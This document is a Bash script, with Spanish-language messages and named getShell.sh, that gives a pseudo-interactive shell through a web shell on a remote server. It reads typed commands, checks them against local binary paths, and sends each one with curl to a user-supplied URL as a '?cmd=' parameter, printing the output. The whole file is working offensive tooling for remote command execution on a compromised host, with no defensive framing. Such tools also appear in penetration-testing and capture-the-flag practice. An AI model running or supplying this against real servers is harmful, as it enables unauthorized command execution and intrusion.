#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

# Variables globales
declare -a local_path
declare -r my_path="/usr/local/bin:/usr/bin:/bin:/usr/games:/sbin:/usr/sbin" # Read only

trap ctrl_c INT

function ctrl_c(){
    echo -e "\n\n${redColour}[!] Saliendo...${endColour}"
    exit 1
}

function helpPanel(){
    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Uso: .getShell.sh${endColour}\n"
    echo -e "\t${purpleColour}u)${endColour}${yellowColour} Dirección URL${endColour}"
}

function makeRequest(){
    echo -e "${purpleColour}"
    curl "$url?cmd=$1"
    echo -ne "${endColour}"
}

function obtainShell(){
    for path in $(echo $my_path | tr ':' ' '); do
        local_path+=($path)
    done

    # echo ${#local_path[@]}
    for element in ${local_path[@]}; do
        echo "EStamos con el path ${element}"
    done

    while [ "$command" != "exit" ]; do
        counter=0; echo -ne "\n${grayColour}$~${endColour} " && read -r command
        #echo ${command}

        for element in ${local_path[@]}; do
            if [ -x $element/$(echo $command | awk '{print $1}') ]; then
                let counter+=1
                break
            elif [ "$(echo $command | awk '{print $1}')" == "cd" ]; then
                let counter+=1
                break
            fi
        done
        
        if [ $counter -eq 1 ]; then
            command=$(echo $command | tr ' ' '+')
            #echo $command
            makeRequest $command
        else
            echo -e "\n${redColour}[!]${endColour} Comando ${blueColour}$(echo $command | awk '{print $1}')${endColour}${grayColour} no encontrado${endColour}"
        fi


    done
}

# Main Function
declare -i parameter_counter=0; while getopts ":u:h:" arg; do
    case $arg in 
        u) url=$OPTARG; let parameter_counter+=1 ;;
        h) helpPanel;;
    esac 
done

if [ $parameter_counter -ne 1 ]; then
    helpPanel
else
    obtainShell
fi
